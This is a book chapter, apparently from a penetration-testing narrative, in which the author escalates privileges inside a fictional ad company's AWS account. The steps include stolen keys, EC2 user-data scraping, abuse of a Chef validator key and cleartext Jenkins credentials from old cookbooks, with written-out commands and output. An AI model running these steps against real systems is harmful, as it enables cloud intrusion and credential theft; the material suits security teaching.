@@ -1,0 +1,535 @@
+<html><head></head><body>
+<section>
+<header>
+<h1 class="chapter">
+<span class="ChapterNumber"><span epub:type="pagebreak" title="167" id="Page_167"/>10</span><br/>
+<span class="ChapterTitle">The Enemy Inside</span></h1>
+</header>
+<figure class="opener">
+<img src="image_fi/book_art/chapterart.png" alt=""/>
+</figure>
+<p class="ChapterIntro">In the previous chapter, we took over MXR Ads’ delivery cluster. This yielded hundreds of secrets, ranging from AWS access keys to GitHub tokens, promising access to pretty much any database involved in the delivery of an ad. We are not yet admins of the AWS account, but it’s barely a nudge away. We need to make sense of all the data we gathered and use it to find a way to escalate privileges, and even perhaps uncover the hidden link between MXR Ads and Gretsch Politico.</p>
+<h2 id="h1-501263c10-0001"><span epub:type="pagebreak" title="168" id="Page_168"/>The Path to Apotheosis</h2>
+<p class="BodyFirst">We load the AWS access keys we retrieved from Kube and check out the permissions of a random user. Kevin from Chapter 8, for instance, is as good a target as any:</p>
+<pre><code>root@Point1:~/# <b>aws iam get-user --profile kevin</b>
+"User": {
+   "UserName": "kevin.duncan",
+<var>--snip--</var></code></pre>
+<p>We know that, by default, IAM users have absolutely zero rights on AWS. They cannot even change their own passwords. Companies will therefore almost always grant users just enough rights on the IAM service that handles users and permissions to perform basic operations like changing passwords, listing policies, enabling multifactor authentication, and so on.</p>
+<p>To limit the scope of these permissions, admins will often add a condition to accept IAM API calls targeting only the calling user. For example, Kevin is probably allowed to list his own permissions, but not those attached to other users:</p>
+<pre><code>root@Point1:~/# <b>aws iam list-attached-user-policies \</b>
+<b>--user-name=kevin.duncan \</b>
+<b>--profile kevin</b>
+
+"PolicyArn": "arn:aws:iam::886371554408:policy/mxrads-self-manage",
+"PolicyArn": "arn:aws:iam::886371554408:policy/mxrads-read-only",
+"PolicyArn": "arn:aws:iam::886371554408:policy/mxrads-eks-admin"</code></pre>
+<p>Indeed, we get an error as soon as we call an IAM command on a resource other than Kevin, like so:</p>
+<pre><code>root@Point1:~/# <b>aws iam get-policy \</b>
+<b>--policy-arn mxrads-self-manage \</b>
+<b>--profile kevin</b>
+ 
+An error occurred (AccessDenied) when calling the GetPolicy operation:
+User: arn:aws:iam::886371554408:user/kevin.duncan is not authorized to
+perform: iam:GetPolicy on resource: policy
+arn:aws:iam::886371554408:policy/mxrads-eks-admin...</code></pre>
+<p>AWS runs a tight ship when it comes to access rights. Thankfully, the names of Kevin’s policies are explicit enough that we can guess their content: mxrads-eks-admin indicates Kevin is admin over the EKS, and mxrads-read-only probably confers Kevin read access to a subset of the 165 AWS services used by MXR Ads. It’s just a matter of trying to deduce which ones. The last policy, mxrads-self-manage, should contain the set of permissions for Kevin to manage his account.</p>
+<p>Each of these services could take hours, even days, to fully explore, especially for a company so invested in AWS and with such a complex business architecture. We need to keep our focus straight: we’re looking for <span epub:type="pagebreak" title="169" id="Page_169"/>anything remotely related to Gretsch Politico—specifically information on their clients or data profiling activity. This might come in the form of an S3 bucket holding <em>Digital Ad Ratings (DAR)</em> segments (used to measure the performance of an advertising campaign), a table on an RDS database, a web server running on EC2, a proxy service on API Gateway, a messaging queue on AWS Simple Queue Service (SQS) . . . in any of the dozen AWS regions currently available. Yes, I feel and share your frustration.</p>
+<p>Luckily, AWS has a useful API that spans multiple resource types and services in a given region: the Resource Groups Tagging API. This API returns S3 buckets, VPC endpoints, databases, and so on, provided that the object possesses a tag or a label. Any company with minimal infrastructure hygiene will make sure to tag its resources, if only for billing purposes, so we can be fairly confident that the results returned by this API call are accurate and comprehensive. We start by listing the resources for the <em>eu-west-1</em> region, as shown in <a href="#listing10-1" id="listinganchor10-1">Listing 10-1</a>.</p>
+<pre><code>root@Point1:~/# <b>aws resourcegroupstaggingapi get-resources \</b>
+<b>--region eu-west-1 \</b>
+<b>--profile kevin &gt; tagged_resources_euw1.txt</b>
+
+root@Point1:~/# <b>head tagged_resources_euw1.txt</b>
+
+ResourceARN: arn:aws:ec2:eu-west-1:886371554408:vpc/vpc-01e638,
+Tags: [ "Key": "Name", "Value": "privateVPC"]
+--<var>snip</var>--
+arn:aws:ec2:eu-west-1:886371554408:security-group/sg-07108...
+arn:aws:lambda:eu-west-1:886371554408:function:tag_index
+arn:aws:events:eu-west-1:886371554408:rule/asg-controller3
+arn:aws:dynamodb:eu-west-1:886371554408:table/cruise_case
+<var>--snip--</var></code></pre>
+<p class="CodeListingCaption"><a id="listing10-1">Listing 10-1</a>: Listing resources for <code>eu-west-1</code></p>
+<p>Had Kevin lacked the necessary privileges to list resource tags (<code>tag:GetResources</code>), we would have had no choice but to manually start exploring the most commonly used AWS services, such as EC2, S3, Lambda, RDS, DynamoDB, API Gateway, ECR, KMS, and Redshift. <em>Redshift</em> is a managed PostgreSQL optimized for analytics, <em>DynamoDB</em> is a managed nonrelational database modeled after MongoDB, <em>API Gateway</em> is a managed proxy that relays requests to the backend of your choice, and <em>Lambda</em> is a service that runs your code on AWS’s own instances (more on that later). These primitive services are even used by AWS itself internally to build more complex offerings like EKS, which is in fact nothing more than the combination of EC2, ECR, API Gateway, Lambda, DynamoDB, and other services.</p>
+<aside epub:type="sidebar">
+<div class="top hr"><hr/></div>
+<section class="note">
+<h2><span class="NoteHead">NOTE</span></h2>
+<p>	There are many AWS auditing and pentesting tools that enumerate services and resources. Check out Toniblyx’s compilation on GitHub at <a href="https://github.com/toniblyx/my-arsenal-of-aws-security-tools/" class="LinkURL">https://github.com/toniblyx/my-arsenal-of-aws-security-tools/</a>. Beware that most of these tools may flood AWS with API calls, an activity that can be picked up with minimal monitoring (more on that later).</p>
+<div class="bottom hr"><hr/></div>
+</section>
+</aside>
+<p><span epub:type="pagebreak" title="170" id="Page_170"/>From <a href="#listing10-1">Listing 10-1</a> we pulled well over 8,000 tagged resources from MXR Ads’ account, so naturally we turn to our trusted <code>grep</code> command to look for references to GP:</p>
+<pre><code>root@Point1:~/# <b>egrep -i "gretsch|politico|gpoli" tagged_resources_euw1.txt</b>
+
+ResourceARN: arn:aws:lambda:eu-west-1:886477354405:function:dmp-sync-gretsch-politico,
+<var>--snip--</var></code></pre>
+<p>Marvelous! There’s our hidden needle. MXR Ads has a Lambda function that seems to exchange data with Gretsch Politico. AWS Lambda is the gold standard of the serverless world. You package Python source code, a Ruby script, or a Go binary in a ZIP file, send it to AWS Lambda along with a few environment variables and CPU/memory specifications, and AWS runs it for you.</p>
+<p>The process involves none of the hassle of machine provisioning, systemd setup, and SSH. You simply point to a ZIP file and it’s executed at the time of your choosing. A Lambda function can even be triggered by external events fired by other AWS services, like a file reception on S3. Lambda is a glorified crontab that has changed the way people orchestrate their workloads.</p>
+<p>Let’s take a closer look at this <code>dmp-sync</code> Lambda function (see <a href="#listing10-2" id="listinganchor10-2">Listing 10-2</a>).</p>
+<pre><code>root@Point1:~/# <b>aws lambda get-function  \</b>
+<b>--function-name dmp-sync-gretsch-politico \</b>
+<b>--region eu-west-1 \</b>
+<b>--profile kevin</b>
+
+<var>--snip--</var>
+RepositoryType: S3,
+Location: https://mxrads-lambdas.s3.eu-west-1.amazonaws.com/functions/dmp-sync-gp?versionId=YbSa...</code></pre>
+<p class="CodeListingCaption"><a id="listing10-2">Listing 10-2</a>: Description of the <code>dmp-sync</code> Lambda function</p>
+<p>We see in <a href="#listing10-2">Listing 10-2</a> that the Lambda function retrieves the compiled code it needs to execute from the S3 path <em>mxrads-lambdas/dmp-sync-gp</em>. We immediately rush to the keyboard and start typing our next command:</p>
+<pre><code>root@Point1:~/# <b>aws s3api get-object \</b>
+<b>--bucket mxrads-lambdas \</b>
+<b>--key functions/dmp-sync-gp dmp-sync-gp \</b>
+<b>--profile kevin</b>
+
+An error occurred (AccessDenied) when calling the GetObject operation:
+Access Denied</code></pre>
+<p>But alas, Kevin is not trusted enough to be granted access to this bucket. We could build a wall with all the “Access Denied” messages we received over the last couple of days.</p>
+<p><span epub:type="pagebreak" title="171" id="Page_171"/>Instead, we look closer at the Lambda definition and see that it impersonates the AWS role <code>lambda-dmp-sync</code> and that it relies on a couple of environment variables to do its bidding (see <a href="#listing10-3" id="listinganchor10-3">Listing 10-3</a>).</p>
+<pre><code>root@Point1:~/# <b>aws lambda get-function \</b>
+<b>--function-name dmp-sync-gretsch-politico \</b>
+<b>--region eu-west-1 \</b>
+<b>--profile kevin</b>
+ 
+<var>--snip--</var>
+Role: arn:aws:iam::886371554408:role/lambda-dmp-sync,
+Environment: {
+   Variables: {
+     <span class="CodeAnnotation" aria-label="annotation1">1</span> SRCBUCKET: mxrads-logs,
+     <span class="CodeAnnotation" aria-label="annotation2">2</span> DSTBUCKET: gretsch-streaming-jobs,
+      SLACK_WEBHOOK: AQICAHajdGiAwfogxzeE887914...,
+      DB_LOGS_PASS: AQICAHgE4keraj896yUIeg93GfwEnep...
+<var>--snip--</var></code></pre>
+<p class="CodeListingCaption"><a id="listing10-3">Listing 10-3</a>: Configuration of the <code>dmp-sync</code> Lambda function</p>
+<p>These settings suggest that the code operates on MXR Ads’ logs <span class="CodeAnnotation" aria-label="annotation1">1</span> and maybe hydrates them with additional information related to delivery campaigns before sending them to Gretsch Politico’s S3 bucket <span class="CodeAnnotation" aria-label="annotation2">2</span>.</p>
+<p>We figure out that this GP bucket is a foreign bucket because it does not appear in our current list of MXR Ads buckets. Needless to say, our current access key will be monumentally denied from even listing that foreign bucket, but we know for a fact that the role associated with the Lambda (<code>lambda-dmp-sync</code>) can. The question is, how do we impersonate this role?</p>
+<p>One possible way to impersonate the Lambda role is to go after the GitHub repo containing the source code of this Lambda function—assuming we can find an account with read/write access. We could then smuggle in a few lines of code to retrieve the role’s access keys at runtime and use them to read the bucket’s contents. It’s tempting, but that procedure carries significant exposure. Between Slack notifications and GitHub emails, the smallest commit could be broadcast to the entire tech team. Not exactly ideal.</p>
+<p>AWS does offer a natural way to impersonate any role through the STS API, but, boy, do we need some privileges to call this command. No sensible admin would include STS APIs in a read-only policy assigned to developers.</p>
+<p>Let’s put a pin in this role impersonation idea and continue exploring other AWS services. Surely there is something we can abuse to elevate privileges.</p>
+<p>Let’s poke around the EC2 service and describe all the running instances (see <a href="#listing10-4" id="listinganchor10-4">Listing 10-4</a>). Remember how last time we tried this in Chapter 8 we were constrained to Kubernetes nodes? Thanks to Kevin’s wide read-only policy, those chains were unshackled.</p>
+<pre><code>root@Point1:~/# <b>aws ec2 describe-instances \</b>
+<b>--region=eu-west-1 \</b>
+<b>--profile kevin &gt; all_instances_euw1.txt</b>
+
+root@Point1:~/# <b>head all_instances_euw1.txt</b>
+<span epub:type="pagebreak" title="172" id="Page_172"/>--<var>snip</var>--
+"InstanceId": "i-09072954011e63aer",
+"InstanceType": "c5.4xlarge",
+"Key": "Name",  "Value": "cassandra-master-05789454"
+
+"InstanceId": "i-08777962411e156df",
+"InstanceType": "m5.8xlarge",
+"Key": "Name",  "Value": "lib-jobs-dev-778955944de"
+
+"InstanceId": "i-08543949421e17af",
+"InstanceType": "c5d.9xlarge",
+"Key": "Name",  "Value": "analytics-tracker-master-7efece4ae"
+
+<var>--snip--</var></code></pre>
+<p class="CodeListingCaption"><a id="listing10-4">Listing 10-4</a>: Describing the EC2 instances of <code>eu-west-1</code></p>
+<p>We discover close to 2,000 machines in the <code>eu-west-1</code> region alone—almost three times more servers than the Kubernetes production cluster handles. MXR Ads is barely dabbling with Kube; it has yet to migrate the rest of its workloads and databases.</p>
+<p>From theses 2,000 machines, we need to pick a target. Let’s forget about business applications; we learned the hard way that MXR Ads severely locks down its IAM roles. We struggled with each access we snatched in the beginning to perform basic reconnaissance. No, to achieve complete dominion over AWS, we need to pwn an infrastructure management tool.</p>
+<h2 id="h1-501263c10-0002">Automation Tool Takeover</h2>
+<p class="BodyFirst">Even with all the automation AWS offers, no team could handle 2,000 servers and hundreds of microservices without the help of an extensive toolset to schedule, automate, and standardize operations. We’re looking for something like Rundeck, Chef, Jenkins, Ansible, Terraform, TravisCI, or any one of the hundreds of DevOps tools.</p>
+<aside epub:type="sidebar">
+<div class="top hr"><hr/></div>
+<section class="note">
+<h2><span class="NoteHead">NOTE</span></h2>
+<p>	Digital.ai has a curious listing of some of the most notorious DevOps tools: <a href="https://digital.ai/periodic-table-of-devops-tools" class="LinkURL">https://digital.ai/periodic-table-of-devops-tools</a>.</p>
+<div class="bottom hr"><hr/></div>
+</section>
+</aside>
+<p>Terraform helps keep track of the components running on AWS, Ansible configures servers and installs the required packages, Rundeck schedules maintenance jobs across databases, and Jenkins builds applications and deploys them to production. The bigger a company scales, the more it needs a solid set of tools and standards to support and fuel that growth. We loop through the list of running machines looking for tool names:</p>
+<pre><code>root@Point1:~/# <b>egrep -i -1 \</b>
+<b>"jenkins|rundeck|chef|terraform|puppet|circle|travis|graphite" all_instances_euw1.txt</b>
+
+"InstanceId": "i-09072954011e63aer",
+"Key": "Name",  "Value": "jenkins-master-6597899842"
+PrivateDnsName": "ip-10-5-20-239.eu-west-1.compute.internal"
+
+<span epub:type="pagebreak" title="173" id="Page_173"/>"InstanceId": "i-08777962411e156df",
+"Key": "Name",  "Value": "chef-server-master-8e7fea545ed"
+PrivateDnsName": "ip-10-5-29-139.eu-west-1.compute.internal"
+
+"InstanceId": "i-08777962411e156df",
+"Key": "Name",  "Value": "jenkins-worker-e7de87adecc"
+PrivateDnsName": "ip-10-5-10-58.eu-west-1.compute.internal"
+
+<var>--snip--</var></code></pre>
+<p>Wonderful! We get hits for Jenkins and Chef. Let’s focus on these two components, as they have great potential.</p>
+<h3 id="h2-501263c10-0001">Jenkins Almighty</h3>
+<p class="BodyFirst">Jenkins is a complex piece of software that can take on many roles. Developers, for instance, can use it to compile, test, and release their code in an automated fashion. For this purpose, when a new file is pushed to a repo, GitHub triggers a POST request (webhook) to Jenkins, which runs end-to-end tests on the newly pushed version of the application. Once the code is merged, Jenkins automatically triggers another job that deploys the code on the production servers. This process is commonly known as <em>continuous</em> <em>integration/continuous delivery (CI/CD)</em>.</p>
+<p>Admins, on the other hand, can use it to run certain infrastructure tasks, like creating Kubernetes resources or spawning a new machine on AWS. Data scientists may schedule their workloads to pull data from a database, transform it, and push it to S3. The use cases abound in the enterprise world and are limited only by the imagination (and sometimes sobriety) of the DevOps folks.</p>
+<p>Tools like Jenkins are literally the agents that enable and empower the utopian ideas blatantly pushed forward by the DevOps philosophy. Indeed, it would be next to impossible for every company to implement from scratch something as complex as continuous testing and delivery. The almost pathological obsession with automating every tiny operation promotes tools like Jenkins from simple testing frameworks to the almighty gods of any infrastructure.</p>
+<p>Since Jenkins needs to dynamically test and build applications, there’ll often be a GitHub token sitting somewhere on disk. It also needs to deploy applications and containers to production, so an admin will often add in AWS access keys with ECR, EC2, and possibly S3 write access to the Jenkins config file. Admins also want to leverage Jenkins to run their Terraform commands, and Terraform has, by design, complete control over AWS. Now so does Jenkins. And since Terraform is managed by Jenkins jobs, why not add in Kubernetes commands as well to centralize operations? Grab those cluster admin privileges, will you? Jenkins needs them.</p>
+<p>When not monitored closely, these CI/CD pipelines—Jenkins, in this case—can quickly develop into the intersection of a complex network of infrastructure nerve fibers that, if stroked gently and knowingly, could lead to ecstasy—and that’s exactly what we’re going to do.</p>
+<p><span epub:type="pagebreak" title="174" id="Page_174"/>We candidly try reaching Jenkins directly with no authentication. Jenkins listens by default on port 8080, so we use our existing meterpreter shell to issue an HTTP query to the server:</p>
+<pre><code># Our backdoored pod on the Kubernetes cluster
+
+meterpreter &gt; <b>execute curl -I -X GET -D http://ip-10-5-20-239.eu-west-1.compute.internal:8080</b>
+
+HTTP/1.1 301
+Location: https://www.github.com/hub/oauth_login
+content-type: text/html; charset=iso-8859-1
+<var>--snip--</var></code></pre>
+<p>We get turned down immediately. It’s only normal, after all, that any half decent company that relies on such a critical component for delivery puts minimal protection in place. The way to Jenkins is not through the front door but rather through a small crack in the alley window: the Chef server that probably helped set up Jenkins in the first place.</p>
+<h3 id="h2-501263c10-0002">Hell’s Kitchen</h3>
+<p class="BodyFirst">Chef, just like Ansible, is a software configuration tool. You enroll a newly installed machine into Chef, and it pulls and executes a set of predefined instructions that set up tools on your machine automatically. If your machine is a web app, for instance, Chef will install Nginx, set up a MySQL client, copy the SSH configuration file, add an admin user, and add any other specified software that’s needed.</p>
+<p>The configuration instructions are written in Ruby and grouped into what Chef calls—in an elaborate conceit—cookbooks and recipes. <a href="#listing10-5" id="listinganchor10-5">Listing 10-5</a> is an example of a Chef recipe that creates a config.json file and adds a user to the <em>docker</em> group.</p>
+<pre><code># recipe.rb
+
+# Copy the file seed-config.json on the new machine
+cookbook_file config_json do
+  source 'seed-config.json'
+  owner 'root'
+end
+
+# Append the user admin to the docker group
+group 'docker' do
+    group_name 'docker'
+    append  true
+    members 'admin'
+    action  :manage
+end
+<var>--snip--</var></code></pre>
+<p class="CodeListingCaption"><a id="listing10-5">Listing 10-5</a>: A Chef recipe that creates a <em>config.json</em> file and adds a user to the <em>docker</em> group</p>
+<p><span epub:type="pagebreak" title="175" id="Page_175"/>Secrets and passwords are a crucial element of any server’s configuration—especially one that, by the very nature of its design, talks to almost every component of the infrastructure. I am talking about Jenkins, of course!</p>
+<p>If you follow good DevOps practices to the letter, everything should be automated, reproducible, and, more importantly, versioned. You can’t just install Jenkins or any other tool by hand. You must use a management tool, like Chef or Ansible, to describe your Jenkins configuration and deploy it on a brand-new machine. Any change to this configuration, like upgrading a plug-in or adding a user, should go through this management tool, which tracks, versions, and tests the changes before applying them to production. That’s the essence of infrastructure as code. What’s a developer’s favorite versioning system for storing code? GitHub, of course!</p>
+<p>We can quickly verify that Chef recipes are stored on GitHub for this task by listing all of MXR Ads’ private repos and looking for any mention of Jenkins-related Chef cookbooks. Remember, we already have a valid GitHub token courtesy of Kubernetes. We first extract the list of repos:</p>
+<pre><code># list_repos.py
+from github import Github
+g = Github("9c13d31aaedc0cc351dd12cc45ffafbe89848020")
+for repo in g.get_user().get_repos():
+    print(repo.name, repo.clone_url)</code></pre>
+<p>We then search for references to keywords such as <em>cookbook</em>, <em>Jenkins</em>, <em>Chef</em>, <em>recipe</em>, and so forth (see <a href="#listing10-6" id="listinganchor10-6">Listing 10-6</a>).</p>
+<pre><code>root@Point1:~/# <b>python3 list_repos.py &gt; list_repos.txt</b>
+root@Point1:~/# <b>egrep -i "cookbook|jenkins|chef" list_repos.txt</b>
+cookbook-generator https://github.com/mxrads/cookbook-generator.git
+cookbook-mxrads-ami https://github.com/mxrads/cookbook-ami.git
+<span class="CodeAnnotationHang" aria-label="annotation1">1</span> cookbook-mxrads-jenkins-ci https://github.com/mxrads/cookbook-jenkins-ci.git
+--<var>snip</var>--</code></pre>
+<p class="CodeListingCaption"><a id="listing10-6">Listing 10-6</a>: A list of MXR Ads’ repos matching at least one of the keywords <em>cookbook</em>, <em>Jenkins</em>, and <em>Chef</em></p>
+<p>Bingo <span class="CodeAnnotation" aria-label="annotation1">1</span>! We download the cookbook-mxrads-jenkins-ci repo:</p>
+<pre><code>root@Point1:~/# <b>git clone https://github.com/mxrads/cookbook-jenkins-ci.git</b></code></pre>
+<p>And then we go through the source code hoping to find some hardcoded credentials:</p>
+<pre><code>root@Point1:~/# <b>egrep -i "password|secret|token|key" cookbook-jenkins-ci</b>
+
+default['jenkins']['keys']['operations_redshift_rw_password'] = 'AQICAHhKmtEfZEcJQ9X...'
+default['jenkins']['keys']['operations_aws_access_key_id'] = 'AQICAHhKmtEfZEcJQ9X...'
+default['jenkins']['keys']['operations_aws_secret_access_key'] = 'AQICAHhKmtEfZEcJQ9X1w...'
+default['jenkins']['keys']['operations_price_cipher_crypto_key'] = 'AQICAHhKmtEfZE...'</code></pre>
+<p><span epub:type="pagebreak" title="176" id="Page_176"/>We find that close to 50 secrets are defined in a file conveniently called <em>secrets.rb</em>, but don’t get excited just yet. These are no mere cleartext passwords. They all start with the six magic letters <code>AQICAH</code>, which suggests they use AWS KMS, a key management service provided by AWS to encrypt/decrypt data at rest. Access to their decryption key requires specific IAM rights, which our user Kevin most likely lacks. The README file of the cookbook is pretty clear about secret management:</p>
+<pre><code># README.md
+
+KMS Encryption :
+
+Secrets must now be encrypted using KMS. Here is how to do so.
+Let's say your credentials are in /path/to/credentials...</code></pre>
+<p>The one keyword I love in that sentence is “now.” This suggests that not so long ago secrets were handled differently, probably not encrypted at all. We take a look at the Git commit history:</p>
+<pre><code>root@Point1:~/# <b>git rev-list --all | xargs git grep "aws_secret"</b>
+
+e365cd828298d55...:secrets.rb:
+default['jenkins']['keys']['operations_aws_secret_access_key'] = 'AQICAHhKmtEfZEcJQ9X1w...'
+
+623b30f7ab4c18f...:secrets.rb:
+default['jenkins']['keys']['operations_aws_secret_access_key'] = 'AQICAHhKmtEfZEcJQ9X1w...'</code></pre>
+<p>Someone must have properly cleaned it up. All previous versions of <em>secrets.rb</em> contain the same encrypted data.</p>
+<p>That’s okay. GitHub is not the only versioned repository to store cookbooks. Chef has its own local datastore where it keeps different versions of its resources. With some luck, maybe we can download an earlier version of the cookbook that contained cleartext credentials.</p>
+<p>Communication with the Chef server is usually well protected. Each server managed by Chef gets a dedicated private key to download cookbooks, policies, and other resources. Admins may also use an API token to perform tasks remotely.</p>
+<p>The silver lining, however, is that there is no segregation between resources. All we need is a valid private key, belonging to a dummy test server for all we care, to be able to read every cookbook file ever stored on Chef. What’s life without trust!</p>
+<p>That private key should not be too hard to find. We have read access to the EC2 API, spanning around 2,000 servers. Surely one of them has a hardcoded Chef private key in its user data. We just need to perform 2,000 API calls.</p>
+<p>What may seem like a daunting and fastidious task at first can actually be easily automated. Thanks to the cookbooks stored in MXR Ads’ GitHub repos, we already know which services rely on Chef: Cassandra (NoSQL database), Kafka (streaming software), Jenkins, Nexus (code repository), Grafana (dashboards and metrics), and a few more.</p>
+<p><span epub:type="pagebreak" title="177" id="Page_177"/>We store these service names as keywords in a file and then feed them to a loop that retrieves the instances bearing a tag name matching the keyword, as shown next. We extract the first instance ID of every pool of machines belonging to the same service since, for example, all Cassandra machines will probably share the same user data, so we only need one instance:</p>
+<pre><code>root@Point1:~/# <b>while read p; do</b>
+<b>  instanceID=$(aws ec2 describe-instances \</b>
+<b>  --filter "Name=tag:Name,Values=*$p*" \</b>
+<b>  --query 'Reservations[0].Instances[].InstanceId' \</b>
+<b>  --region=eu-west-1 \</b>
+<b>  --output=text)</b>
+<b>  echo $instanceID &gt; list_ids.txt</b>
+<b>done &lt;services.txt</b></code></pre>
+<p>This rather improvised sampling method gives us about 20 instance IDs, each referring to a machine hosting a different service:</p>
+<pre><code>root@Point1:~/# <b>head list_ids.txt</b>
+i-08072939411515dac
+i-080746959025ceae
+i-91263120217ecdef
+<var>--snip--</var></code></pre>
+<p>We loop through this file calling the <code>ec2 describe-instance-attribute</code> API to fetch the user data, decode it, and store it in a file:</p>
+<pre><code>root@Point1:~/# <b>while read p; do</b>
+<b>  userData=$(aws ec2 describe-instance-attribute \</b>
+<b>  --instance-id $p \</b>
+<b>  --attribute userData \</b>
+<b>  --region=eu-west-1 \</b>
+<b>  | jq -r .UserData.Value | base64 -d)</b>
+<b>  echo $userData &gt; $p.txt</b>
+<b>done &lt;list_ids.txt</b></code></pre>
+<aside epub:type="sidebar">
+<div class="top hr"><hr/></div>
+<section class="note">
+<h2><span class="NoteHead">NOTE</span></h2>
+<p>	The <code>describe-instance-attribute</code> API call is often granted without so much as a second thought through a <code>describe*</code> policy. If it’s blocked, we can attempt to grab the launch configuration of an auto-scaling group, which usually holds the same data: <code>aws autoscaling describe-launch-configurations</code> or <code>aws ec2 describe-launch-templates</code>.</p>
+<div class="bottom hr"><hr/></div>
+</section>
+</aside>
+<p>We check to see how many files were created and confirm the files contain user data scripts:</p>
+<pre><code>root@Point1:~/# <b>ls -l i-*.txt |wc -l</b>
+21
+root@Point1:~/# <b>cat i-08072939411515dac.txt</b>
+<span epub:type="pagebreak" title="178" id="Page_178"/>encoding: gzip+base64
+  path: /etc/ssh/auth_principals/user
+  permissions: "0644"
+- content: |-
+    #!/bin/bash
+<var>--snip--</var></code></pre>
+<p>Perfect. Now for the moment of truth. Do any of these fine servers have a Chef private key declared in their user data? We look for the “RSA PRIVATE KEY” keywords:</p>
+<pre><code>root@Point1:~/# <b>grep -7 "BEGIN RSA PRIVATE KEY" i-*.txt</b>
+<var>--snip--</var>
+<span class="CodeAnnotationHang" aria-label="annotation1">1</span> cat &lt;&lt; EOF
+chef_server_url 'https://chef.mxrads.net/organizations/mxrads'
+validation_client_name 'chef-validator'
+EOF
+)&gt; /etc/chef/client.rb
+
+<var>--snip--</var>
+<span class="CodeAnnotationHang" aria-label="annotation2">2</span> cat &lt;&lt; EOF
+-----BEGIN RSA PRIVATE KEY-----
+MIIEpAIBAAKCAQEAqg/6woPBdnwSVjcSRQenRJk0MePELfPp
+<var>--snip--</var>
+)&gt; /etc/chef/validation.pem</code></pre>
+<p>It’s almost too easy. The first snippet of code defines key parameters used by Chef and stores them in the <em>client.rb</em> file. The second snippet writes a private key to a file called <em>validation.pem</em>.</p>
+<p>This private key is different from the one we were hoping for, but we will make it work. The key we obtained is a validation key, the private key of the <em>chef-validator</em> user assigned to instances to establish their first contact with the Chef server. The <em>chef-validator</em> is not allowed to list machines, cookbooks, or other sensitive operations, but it has the ultimate power of registering clients (machines), which in the end grants them private keys that can perform said operations. All’s well that ends well.</p>
+<p>This user’s private key is shared among all instances wishing to join the Chef server. So, naturally, we can also use it to register an additional machine and receive our very own private key. We just have to mimic a real client configuration and nicely ask the Chef server from within the VPC.</p>
+<p>We create the required files to initiate a machine registration—<em>client.rb </em><span class="CodeAnnotation" aria-label="annotation1">1</span> and <em>validation.pem </em><span class="CodeAnnotation" aria-label="annotation2">2</span>—and populate them with the data harvested from the user data script, as shown next. This is just lazy copy-pasting, really:</p>
+<pre><code>meterpreter &gt; <b>execute -i -f cat &lt;&lt; EOF</b>
+chef_server_url 'https://chef.mxrads.net/organizations/mxrads'
+validation_client_name 'chef-validator'
+EOF
+)&gt; /etc/chef/client.rb
+
+<span epub:type="pagebreak" title="179" id="Page_179"/>meterpreter &gt; <b>execute -i -f cat &lt;&lt; EOF</b>
+-----BEGIN RSA PRIVATE KEY-----
+MIIEpAIBAAKCAQEAqg/6woPBdnwSVjcSRQenRJk0MePELfPp
+<var>--snip--</var>
+)&gt; /etc/chef/validation.pem</code></pre>
+<p>We then download and execute the Chef client from within our backdoor to initiate the registration process of our machine:</p>
+<pre><code>meterpreter &gt; <b>execute -i -f apt update &amp;&amp; apt install -y chef</b>
+meterpreter &gt; <b>execute -i -f chef-client</b>
+
+Starting Chef Client, version 14.8.12
+Creating a new client identity for aws-node-78ec.eu-west-1.compute.internal
+using the validator key.
+
+Synchronizing Cookbooks:
+Installing Cookbook Gems:
+Compiling Cookbooks...
+Running handlers complete
+Chef Client finished, 0/0 resources updated in 05 seconds
+
+meterpreter &gt; <b>ls /etc/chef/</b>
+
+client.pem client.rb validation.pem</code></pre>
+<p>That’s it. We are done. We smuggled a new machine into the Chef server’s catalog and received a new private key called <em>client.pem</em>.</p>
+<p>The <code>chef-client</code> executable handles the state of the machine, including applying the relevant cookbook, registering the machine, and more. To explore the resources defined on the Chef server, we need to use the <code>knife</code> utility. This is part of the Chef standard package, but it needs a small configuration file to run properly. Here’s a sample config file, based on the output of the <code>chef-client</code> command executed earlier (to retrieve the machine’s name) and the <em>client.rb</em> configuration:</p>
+<pre><code># ~/root/.chef/knife.rb
+node_name       'aws-node-78ec.eu-west-1.compute.internal'
+client_key      '/etc/chef/client.pem'
+chef_server_url 'https://chef.mxrads.net/organizations/mxrads'
+knife[:editor] = '/usr/bin/vim'</code></pre>
+<p>With <code>knife</code> configured, let’s use it to list the Chef server’s cookbook catalog:</p>
+<pre><code>meterpreter &gt; <b>knife cookbooks list</b>
+apt                         7.2.0
+ark                         4.0.0
+build-essential             8.2.1
+jenkins-ci                  10.41.5
+<var>--snip--</var></code></pre>
+<p><span epub:type="pagebreak" title="180" id="Page_180"/>Fantastic, there is our dear jenkins-ci cookbook. Let’s take a closer look at the version history of that cookbook:</p>
+<pre><code>meterpreter &gt; <b>knife cookbooks show jenkins-ci</b>
+10.9.5 10.9.4 10.9.4 10.9.3 10.9.2 10.9.1 10.9.8 10.9.7...
+4.3.1 4.3.0 3.12.9 3.11.8 3.11.7 3.9.3 3.9.2 3.9.1</code></pre>
+<p>We can see that the sneaky Chef server is keeping more than 50 versions of this cookbook, from 10.9.5 all the way down to 3.9.1. Now we need to find the most recent cookbook with cleartext credentials—ideally, right before the switch to KMS.</p>
+<p>We start checking different versions, beginning with the latest ones, and after a few attempts we land on cookbook version 10.8.6:</p>
+<pre><code>meterpreter &gt; <b>knife cookbooks show jenkins-ci 10.8.6</b>
+attributes:
+  checksum:    320a841cd55787adecbdef7e7a5f977de12d30
+  name:        attributes/secrets.rb
+  url:         https://chef.mxrads.net:443/bookshelf/organization-
+26cbbe406c5e38edb280084b00774500/checksum-320a841cd55787adecbdef7e7a5f977de12d30?AWSAccessKeyId=25ecce65728a200d6de4bf782ee0a5087662119
+&amp;Expires=1576042810&amp;Signature=j9jazxrJjPkHQNGtqZr1Azu%2BP24%3D
+--<var>snip</var>--
+meterpreter &gt; <b>curl https://chef.mxrads.net:443/bookshelf/org...</b>
+
+<span class="CodeAnnotation" aria-label="annotation1">1</span>'AWS_JENKINS_ID' =&gt; 'AKIA55ZRK6ZS2XX5QQ4D',
+  'AWS_JENKINS_SECRET' =&gt; '6yHF+L8+u7g7RmHcudlCqWIg0SchgT',
+<var>--snip--</var></code></pre>
+<p>Holy cow, we have it! Jenkins’s own AWS access keys in cleartext <span class="CodeAnnotation" aria-label="annotation1">1</span>. If this little baby is not admin of the AWS account, I don’t know who is.</p>
